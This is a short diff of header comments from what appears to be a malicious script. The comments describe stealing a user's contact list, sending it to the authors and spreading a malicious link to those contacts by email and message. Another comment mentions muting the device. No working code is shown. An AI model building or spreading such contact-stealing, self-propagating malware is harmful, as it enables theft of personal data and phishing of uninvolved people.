@@ -1,5 +1,5 @@
 -- This script steals the user's contact list and sends it to us.
--- Then it emails those contacts with a malicious link from the user.
+-- Then it emails and messages those contacts with a malicious link from the user.
 -- DO NOT RUN UNLESS YOU WANT YOUR CONTACTS STOLEN
 
 -- Mutes the Device
